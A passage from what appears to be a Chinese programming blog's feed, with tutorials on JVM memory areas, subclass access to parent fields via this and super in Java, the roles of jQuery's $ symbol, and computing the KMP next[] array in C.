</li>
<li><p><strong>本地方法栈：</strong>JVM调用操作系统方法使用的栈</p>
</li>
<li><p><strong>堆：</strong>是JVM执行java代码使用的堆；<strong>主要存放new出来的对象</strong></p>
</li>
<li><p><strong>程序计数器：</strong>是JVM执行程序的流水线，存放一些跳转指令    </p>
</li>
</ul>
<h2 id="new-类名（）底层做了什么？"><a href="#new-类名（）底层做了什么？" class="headerlink" title="new 类名（）底层做了什么？"></a>new 类名（）底层做了什么？</h2><p>可以简单的分为以下几个步骤：</p>
<ol>
<li>检查方法区中，有无该类模板——&gt;</li>
<li>生成一个对象，存储在堆中——&gt;</li>
<li>如果有对象的引用变量，则在栈中生成该引用变量，并将该引用变量指向堆中对应的对象</li>
</ol>
<p>具体看另一篇博客：<a href="https://liu-ruyang.github.io/2021/10/23/new%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%BA%95%E5%B1%82%E5%81%9A%E4%BA%86%E5%93%AA%E4%BA%9B%E4%BA%8B%E6%83%85/">new一个对象，底层做了哪些事情 | 代码流畅，心情舒畅！ (liu-ruyang.github.io)</a></p>
]]></content>
      <tags>
        <tag>JVM</tag>
        <tag>JVM体系结构</tag>
        <tag>内存分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中有关子类访问父类成员</title>
    <url>/2021/10/19/Java%E4%B8%AD%E6%9C%89%E5%85%B3%E5%AD%90%E7%B1%BB%E8%AE%BF%E9%97%AE%E7%88%B6%E7%B1%BB%E6%88%90%E5%91%98/</url>
    <content><![CDATA[<h2 id="Java寻找属性的顺序过程"><a href="#Java寻找属性的顺序过程" class="headerlink" title="Java寻找属性的顺序过程"></a>Java寻找属性的顺序过程</h2><span id="more"></span>

<h3 id="对象创建"><a href="#对象创建" class="headerlink" title="对象创建"></a>对象创建</h3><p>在new一个子类对象的时候，首先会先new一个父类对象，然后将子类新增的属性套在父类对象外面</p>
<p><img src="https://i.loli.net/2021/10/19/X1m4TYgUWq7ye2I.png" alt="image-20211019125340987"></p>
<h3 id="获取属性途径"><a href="#获取属性途径" class="headerlink" title="获取属性途径"></a>获取属性途径</h3><p><strong>①通过属性名直接获取</strong></p>
<p>会从最外层向里逐层寻找，直至找到属性结束、或者遇到private终止</p>
<p><strong>②通过方法获取对象的方法</strong></p>
<p>本文讨论的是第②种，通过方法获取属性的情况</p>
<h2 id="关于父类私有属性的访问"><a href="#关于父类私有属性的访问" class="headerlink" title="关于父类私有属性的访问"></a>关于父类私有属性的访问</h2><p>在java中，子类是可以继承父类的私有属性的，但是<strong>不可以直接访问</strong>（需要通过方法或者super.父类方法）</p>
<p><strong>此时，需要分两种情况考虑：</strong></p>
<h3 id="父类的操作成员属性的方法没有被重写："><a href="#父类的操作成员属性的方法没有被重写：" class="headerlink" title="父类的操作成员属性的方法没有被重写："></a>父类的操作成员属性的方法<strong>没有被重写：</strong></h3><p>没有被重写时，可以直接通过子类调用继承自父类的public属性的方法，获取到父类的私有属性</p>
<p><img src="https://i.loli.net/2021/10/19/LsFHEeiXRpjVJnw.png" alt="image-20211019124501145"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 父类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 子类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="comment">//没有重写父类的方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">        dog.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        System.out.println(dog.getName());      <span class="comment">//输出zhangsan</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="父类操作成员属性的方法被重写："><a href="#父类操作成员属性的方法被重写：" class="headerlink" title="父类操作成员属性的方法被重写："></a>父类操作成员属性的方法<strong>被重写：</strong></h3><p><img src="https://i.loli.net/2021/10/19/zWZbfQEn27V9TI3.png" alt="image-20211019124630193"></p>
<h4 id="情况一：重写方法后，如果使用super关键字，是获取或者操作父类的属性，"><a href="#情况一：重写方法后，如果使用super关键字，是获取或者操作父类的属性，" class="headerlink" title="情况一：重写方法后，如果使用super关键字，是获取或者操作父类的属性，"></a>情况一：重写方法后，如果使用super关键字，是获取或者操作父类的属性，</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 父类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 子类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="comment">//重写父类的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.getName();			<span class="comment">//重写方法后，要想调用父类的属性，就需要使用super关键字</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">        dog.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        System.out.println(dog.getName());      <span class="comment">//输出zhangsan</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="情况二：如果使用的是this关键字，获取或操作的是套在父类外面的属性"><a href="#情况二：如果使用的是this关键字，获取或操作的是套在父类外面的属性" class="headerlink" title="情况二：如果使用的是this关键字，获取或操作的是套在父类外面的属性"></a>情况二：如果使用的是this关键字，获取或操作的是套在父类外面的属性</h4><p>使用this关键字，调用的是套在父类外面的属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 父类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 子类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;		<span class="comment">//使用this关键字，就需要有这个name属性存在</span></span><br><span class="line">    <span class="comment">//没有重写父类的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;		<span class="comment">//使用this关键字，调用的是套在父类外面的属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 测试类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">        dog.setName(<span class="string">&quot;zhangsan&quot;</span>);				<span class="comment">//这里是给父类中的属性进行了赋值</span></span><br><span class="line">        System.out.println(dog.getName());      <span class="comment">//输出null</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不论是private修饰父类的属性，还是public修饰父类的属性，都需要先看一下父类的方法有没有被子类重写；如果重写，则需要看使用的是this关键字，还是super关键字，this获取和操作父类外面的属性，super获取和操作父类里面的属性。如果没有被重写，调用的方法都是父类的public修饰的方法，因此也就是对父类的属性获取和操作。</p>
<p><img src="https://i.loli.net/2021/10/19/vATgMbuqNPnro4Z.png" alt="image-20211019131731555"></p>
]]></content>
      <tags>
        <tag>对象创建</tag>
        <tag>访问对象属性</tag>
        <tag>访问父类私有属性</tag>
        <tag>super作用</tag>
        <tag>this作用</tag>
      </tags>
  </entry>
  <entry>
    <title>jQuery框架中的“美元符号”的作用</title>
    <url>/2021/10/21/Jquery%E6%A1%86%E6%9E%B6%E4%B8%AD%E7%9A%84%E2%80%9C%E7%BE%8E%E5%85%83%E7%AC%A6%E5%8F%B7%E2%80%9D%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    <content><![CDATA[<h2 id="在普通JavaScript中"><a href="#在普通JavaScript中" class="headerlink" title="在普通JavaScript中"></a>在普通JavaScript中</h2><span id="more"></span>

<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>如果不是在框架中，美元符号单纯的只是一个符号，和普通的一个字母的功能没有区别。</p>
<p>我们可以在<a href="https://www.w3school.com.cn/js/js_variables.asp">JavaScript 变量 (w3school.com.cn)</a>网站上看到这样的定义：</p>
<p><img src="https://i.loli.net/2021/10/21/5cORTM2PJDo4hGd.png" alt="image-20211021191943315"></p>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>在浏览器的控制台中验证上面想法</p>
<p><img src="https://i.loli.net/2021/10/21/KfEG3QPWX9Zy7k5.png" alt="image-20211021192158058"></p>
<h2 id="在jQuery框架中"><a href="#在jQuery框架中" class="headerlink" title="在jQuery框架中"></a>在jQuery框架中</h2><p>在jQuery中，美元符号被赋予了其他的功能</p>
<h3 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h3><p>首先，得明白一个道理：**在jQuery中，符号“$”的作用 就是 ”jQuery“的一个别称 **</p>
<p>所以，在jQuery中，**$的作用就是jQuery的作用**</p>
<h3 id="作用一：选择器"><a href="#作用一：选择器" class="headerlink" title="作用一：选择器"></a>作用一：选择器</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(selector)</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">jQuery(selector)</span><br></pre></td></tr></table></figure>

<h4 id="①jQuery-元素选择器"><a href="#①jQuery-元素选择器" class="headerlink" title="①jQuery 元素选择器"></a>①jQuery 元素选择器</h4><p><strong>jQuery 使用 CSS 选择器来选取 HTML 元素。</strong></p>
<p><code>$(&quot;p&quot;)</code>                选取 &lt;p&gt; 元素。</p>
<p><code>$(&quot;p.intro&quot;)</code>   选取所有 class=”intro” 的 &lt;p&gt; 元素。</p>
<p><code>$(&quot;p#demo&quot;)</code>     选取所有 id=”demo” 的 &lt;p&gt; 元素。</p>
<h4 id="②jQuery-属性选择器"><a href="#②jQuery-属性选择器" class="headerlink" title="②jQuery 属性选择器"></a>②jQuery 属性选择器</h4><p><strong>jQuery 使用 XPath 表达式来选择带有给定属性的元素。</strong></p>
<p><code>$(&quot;[href]&quot;)</code>                 选取所有带有 href 属性的元素。</p>
<p><code>$(&quot;[href=&#39;#&#39;]&quot;)</code>         选取所有带有 href 值等于 “#” 的元素。</p>
<p><code>$(&quot;[href!=&#39;#&#39;]&quot;)</code>       选取所有带有 href 值不等于 “#” 的元素。</p>
<p><code>$(&quot;[href$=&#39;.jpg&#39;]&quot;)</code> 选取所有 href 值以 “.jpg” 结尾的元素。</p>
<h4 id="③jQuery-CSS-选择器"><a href="#③jQuery-CSS-选择器" class="headerlink" title="③jQuery CSS 选择器"></a>③jQuery CSS 选择器</h4><p><strong>jQuery CSS 选择器可用于改变 HTML 元素的 CSS 属性。</strong></p>
<p>下面的例子把所有 p 元素的背景颜色更改为红色：</p>
<p><code>$(&quot;p&quot;).css(&quot;background-color&quot;,&quot;red&quot;);</code></p>
<h3 id="作用二：功能函数前缀"><a href="#作用二：功能函数前缀" class="headerlink" title="作用二：功能函数前缀"></a>作用二：功能函数前缀</h3><p>jQuery 中有一些自带的功能函数，例如<strong>trim()：用于清理字符串前后空格。</strong>引入了jQuery 框架后，就可以按如下方式<strong>调用</strong>这些函数<strong>（注意是直接调用了）</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.trim(sString);</span><br><span class="line"></span><br><span class="line"><span class="comment">//以上代码相当于：</span></span><br><span class="line"></span><br><span class="line">jQuery.trim(sString);</span><br></pre></td></tr></table></figure>

<h3 id="作用三：解决window-onload函数的冲突"><a href="#作用三：解决window-onload函数的冲突" class="headerlink" title="作用三：解决window.onload函数的冲突"></a>作用三：解决window.onload函数的冲突</h3><h4 id="window-onload-的作用"><a href="#window-onload-的作用" class="headerlink" title="window.onload()的作用"></a>window.onload()的作用</h4><p><strong>window.onload()<strong>： 方法用于在</strong>网页加载完毕后立刻执行</strong>的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。</p>
<p><strong>①只有一个要执行的函数</strong>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.onload &#x3D; funcRef;</span><br></pre></td></tr></table></figure>

<p>在页面加载完成后 funcRef 方法会被调用。</p>
<p><strong>②有多个要执行的函数</strong>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.onload&#x3D;function()&#123;</span><br><span class="line">    Func1();</span><br><span class="line">    Func2();</span><br><span class="line">    Func3();</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在页面加载完成后依次执行 Func1、Func2、Func3。</p>
<h4 id="导致问题"><a href="#导致问题" class="headerlink" title="导致问题"></a>导致问题</h4><p>由于页面的HMTL框架需要在页面完全加载之后才能使用，因此在DOM编程时window.onload函数</p>
<p>频繁被使用。倘若页面中有多处都需要使用该函数，或者其他.js文件中也包含window.onload函数，</p>
<p>冲突问题十分棘手</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>jQuery中的ready()方法很好的解决了上述问题，它能够自动将其中的函数在页面加载完成后运行，</p>
<p>并且同一个页面中可以使用多个ready()方法，而且不互相冲突。例如</p>
<p><img src="https://i.loli.net/2021/10/21/kxSVXyHEuABRID1.png" alt="image-20211021195043967"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    $(<span class="string">&quot;table.datalist tr:nth-child(odd)&quot;</span>).addClass(<span class="string">&quot;altrow&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//对于上述代码jQuery还提供了简写，可以省略其中的&quot;(document).ready&quot;部分，代码如下：</span></span><br><span class="line"></span><br><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    $(<span class="string">&quot;table.datalist tr:nth-child(odd)&quot;</span>).addClass(<span class="string">&quot;altrow&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="作用四：创建DOM元素"><a href="#作用四：创建DOM元素" class="headerlink" title="作用四：创建DOM元素"></a>作用四：创建DOM元素</h3><p>利用DOM方法创建元素节点，通常需要将document.createElement_x()、document.create TextNode()、ppendChild()配合使用，十分麻烦，</p>
<p>而jQuery中使用”$”符号可以直接创建DOM元素。</p>
<p>例如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> oNewP = $(<span class="string">&quot;这是一个好故事&lt;/&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>以上代码等同于javascript中的如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> oNewP = <span class="built_in">document</span>.createElement_x(<span class="string">&quot;p&quot;</span>);<span class="comment">// 新建节点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oText = <span class="built_in">document</span>.createTextNode(<span class="string">&quot;这是一个好故事&quot;</span>);</span><br><span class="line"></span><br><span class="line">oNewP.appendChild(oText);</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>①在普通JavaScript中，美元符号作用等同于普通字母</p>
<p>②在jQuery框架中，美元符号作用有四个：</p>
<ul>
<li>选择器</li>
<li>功能函数前缀</li>
<li>解决window.onload()函数的冲突</li>
<li>创建DOM元素</li>
</ul>
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery框架</tag>
        <tag>$符号</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-KMP字符串匹配</title>
    <url>/2021/11/30/KMP%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><span id="more"></span>

<p>KMP算法用途是进行字符串的匹配。</p>
<p><strong>KMP算法</strong>相对于暴力算法有着较大的改进，主要是<strong>消除了主串指针的回溯</strong>（即主串只需要扫描一遍），从而使算法的效率有了某种程度的提高</p>
<p>**时间复杂度：O(n+m)**，n是主串的长度，m是模式串的长度</p>
<p>那么KMP算法是如何消除对主串的回溯的呢？</p>
<p>那么便需要理解KMP算法中的两个核心的东西：<strong>next[]数组</strong>（该数组由模式串决定），<strong>借助next[]数组 把 主串 和 模式串 进行匹配</strong>。</p>
<h2 id="next-数组"><a href="#next-数组" class="headerlink" title="next[]数组"></a>next[]数组</h2><p>KMP算法的第一项工作便是求出next数组（换句话说就是，next[]数组是KMP算法得以进行的前提条件）。</p>
<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p><strong>next[]数组的作用：万一模式串的某一个字符与主串匹配失败的时候，next[]数组对应下标的值可以指示模式串向右移动的步数</strong>（重点，作用理透了，next数组的底层原理，也就懂了一大半了）（参见下面的各变量的含义的“从全局上看”，两者是一个意思）</p>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在计算next数组之前，我们先理解几个<strong>next[]数组中所涉及到的概念</strong>：</p>
<ul>
<li>前缀</li>
<li>后缀</li>
<li>最大公共前、后缀</li>
</ul>
<p><img src="https://i.loli.net/2021/11/30/KHRjNDcV1JzFbGi.png" alt="image-20211130204952589"></p>
<p><img src="https://i.loli.net/2021/11/30/d2HQ6OcJCFIyevk.png" alt="image-20211130205213016"></p>
<p>那么，最大公共前、后缀，理所当然就是指前缀、后缀中最大长度公共的辣！（可以轻松肉眼看出，上面字符串的最大公共前、后缀的长度为0，这算是当时设计的失误吧<img src="https://i.loli.net/2021/11/30/567cthCiejH8Pru.png" alt="img">)</p>
<p>好了，基本概念讲到这就结束了。</p>
<h3 id="计算next-数组"><a href="#计算next-数组" class="headerlink" title="计算next[]数组"></a>计算next[]数组</h3><p>在计算next[]数组的时候，有两种理解方式，但是这两种区别不大，分别是：</p>
<ol>
<li><p>模式串的下标为0的地方存储字符数据</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Getnext</span><span class="params">(<span class="keyword">int</span> next[],String t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> j=<span class="number">0</span>,k=<span class="number">-1</span>;</span><br><span class="line">   next[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">   <span class="keyword">while</span>(j&lt;t.length<span class="number">-1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">if</span>(k == <span class="number">-1</span> || t[j] == t[k])</span><br><span class="line">      &#123;</span><br><span class="line">         j++;k++;</span><br><span class="line">         next[j] = k;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> k = next[k];<span class="comment">//此语句是这段代码最反人类的地方，如果你一下子就能看懂，那么请允许我称呼你一声大神！</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>模式串的下标为0的地方不存储字符数据（本文采取这种，因为这种或许理解起来，更人性化一丢丢）（但是两种从本质上来讲，是一样的，理解了一种之后，在看另一种，也就懂了）</p>
</li>
</ol>
<p>先放上代码（看不懂没关系，接着往后看讲解就行）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ch数组是模式串，length是模式串的长度，next数组就是我们所要求的next[]数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getnext</span><span class="params">(<span class="keyword">char</span> ch[],<span class="keyword">int</span> length, <span class="keyword">int</span> next[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; length) &#123;</span><br><span class="line">        <span class="keyword">if</span>(j == <span class="number">0</span> || ch[i] == ch[j])</span><br><span class="line">            next[++i] = ++j;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            j = next[j];	<span class="comment">//j回退</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先我们要这段程序里，每个变量所代表的意思是什么？</p>
<h4 id="各变量的含义"><a href="#各变量的含义" class="headerlink" title="各变量的含义"></a>各变量的含义</h4><blockquote>
<p><strong>！一定要知道各变量的含义！</strong></p>
<p><strong>！一定要知道各变量的含义！</strong></p>
<p><strong>！一定要知道各变量的含义！</strong></p>
<p>ch，length，next三个变量不再多说；</p>
<p><strong>i</strong>，在本段代码中代表的是<strong>当前next已经计算到的位置</strong>（next[]数组是从0开始往右计算的）</p>
<p><strong>j</strong>，在本单代码中表示的是<strong>对于每段字符串（对于整个模式串，会将其像前缀那样分解成一个一个小的字符串计算next数组）的前缀的最后一个字符的下一个位置</strong>（后面需要用到 j 的回退）</p>
<ul>
<li><strong>从全局看</strong>，next[]数组表示的是万一模式串的某一个字符与主串匹配失败时，所需要将模式串右移的步数；</li>
<li><strong>从局部上看，</strong>j是next数组能够每一个值都计算正确（即某一个字符匹配失败的时候，能够将模式串右移正确的步数）的保障（因为j可以回退）</li>
</ul>
</blockquote>
<h4 id="程序过程讲解"><a href="#程序过程讲解" class="headerlink" title="程序过程讲解"></a>程序过程讲解</h4><p>过程讲解主要抓住两点：<strong>条件</strong>+<strong>结果变化</strong></p>
<p>起始值：j=0，i=1</p>
<p><img src="https://i.loli.net/2021/12/01/MXFqu7vdzB2QxAJ.png" alt="image-20211201001018536"></p>
<p>状态0：条件：<code>j == 0</code>；结果变化：<code>next[++i] = ++j;</code>，执行后，j = 1，i = 2，next[1]=0，next[2]=1</p>
<p><img src="https://i.loli.net/2021/12/01/wS4Gl5ryWFvImnJ.png" alt="image-20211201001114435"></p>
<p>状态1：条件：<code>j == 0 || ch[i] == ch[j]</code>为假；结果变化：<code>j = next[j]</code>；执行后，j=0，i=2，next[1]=0，next[2]=1</p>
<p><img src="https://i.loli.net/2021/12/01/8IvcxoX5bPJnudD.png" alt="image-20211201001157288"></p>
<p>状态2：条件：<code>j == 0</code>；结果变化：<code>next[++i] = ++j</code>；执行后，j=1，i=3，next[1]=0，next[2]=1，next[3]=1</p>
<p><img src="https://i.loli.net/2021/12/01/OneK5WPcuybd9Q2.png" alt="image-20211201001241442"></p>
<p>状态3：条件：<code>j == 0 || ch[i] == ch[j]</code>为假；结果变化：<code>j = next[j]</code>；执行后，j=0，i=3，next[1]=0，next[2]=1，next[3]=1</p>
<p><img src="https://i.loli.net/2021/12/01/RT3Py1g2mQH9Lzn.png" alt="image-20211201001426114"></p>
<p>状态4：条件：<code>j == 0</code>；结果变化：<code>next[++i] = ++j</code>；执行后，j=1，i=4，next[1]=0，next[2]=1，next[3]=1，next[4]=1</p>
<p><img src="https://i.loli.net/2021/12/01/i37zwESFDmLZMsj.png" alt="image-20211201001503800"></p>
<p>状态5：条件：<code>j == 0 || ch[i] == ch[j]</code>为假；结果变化：<code>j = next[j]</code>；执行后，j=0，i=4，next[1]=0，next[2]=1，next[3]=1，next[4]=1</p>
<p><img src="https://i.loli.net/2021/12/01/1ITXAZoKdvH6NLt.png" alt="image-20211201001523604"></p>
<p>状态6：条件：<code>j == 0</code>；结果变化：<code>next[++i] = ++j</code>；执行后，j=1，i=5，next[1]=0，next[2]=1，next[3]=1，next[4]=1，next[5]=1</p>
<p><img src="https://i.loli.net/2021/12/01/R5a2UQAIlEuS7BX.png" alt="image-20211201001556363"></p>
<p>状态7：条件：<code>ch[i] == ch[j]</code>；结果变化：<code>next[++i] = ++j</code>；执行后，j=2，i=6，next[1]=0，next[2]=1，next[3]=1，next[4]=1，next[5]=1，next[6] =2</p>
<p><img src="https://i.loli.net/2021/12/01/wHPGik9p83OK1dy.png" alt="image-20211201001735982"></p>
<p>状态8：条件：<code>ch[i] == ch[j]</code>；结果变化：<code>next[++i] = ++j</code>；执行后，j=3，i=7，next[1]=0，next[2]=1，next[3]=1，next[4]=1，next[5]=1，next[6] =2，next[7]=3</p>
<p><img src="https://i.loli.net/2021/12/01/wa6JquUi91YtN7Q.png" alt="image-20211201001825655"></p>
<p>状态9：此时，条件：<code>i &lt; length</code>已经不满足，所以跳出循环，此时<strong>next[]数组计算结束</strong></p>
<h4 id="next-数组计算过程总结"><a href="#next-数组计算过程总结" class="headerlink" title="next[]数组计算过程总结"></a>next[]数组计算过程总结</h4><p>经过上述的过程剖析，有这样几个发现：</p>
<ol>
<li>这里下标并没有用到0</li>
<li>i自始至终没有回退</li>
<li>j有回退，但是一直处于前缀当中</li>
</ol>
<p>暂时可以下几个结论（同时也佐证了上面所讲的<strong>各变量的含义</strong>）：</p>
<ol>
<li><strong>next[k]的值是由前面k-1个字符所组成的字符串</strong>（不看k位置的字符）（确切的说，是前k-1个字符所组成的字符串的最大公共前、后缀的长度）决定的</li>
<li>j==0判断为真，的作用是为了让k处的字符匹配失败的时候，能够让下标为1处的字符与主串进行匹配</li>
</ol>
<p>理解到这就是成功一大半啦！</p>
<p><img src="https://i.loli.net/2021/11/30/yRcok5pSYlgvEJK.jpg" alt="src=http___hbimg.b0.upaiyun.com_c9b3313f36ec6b50c17ad05a6b4d84f6532729c136dd2-t5mggH_fw658&amp;refer=http___hbimg.b0.upaiyun"></p>
<h2 id="KMP算法匹配"><a href="#KMP算法匹配" class="headerlink" title="KMP算法匹配"></a>KMP算法匹配</h2><p>经过上面的步骤，我们现在已经有了next数组了。接下来只需要借助next数组进行模式串和主串匹配就可以了。</p>
<p>要想将主串和模式串进行比较，</p>
<p>因为next[]计算方式采取的是上面的第二种方式（即下标为0的位置不存储字符数据），所以KMP匹配算法也才去对应的下标为0的地方不存储字符数据。</p>
<p>上代码：</p>
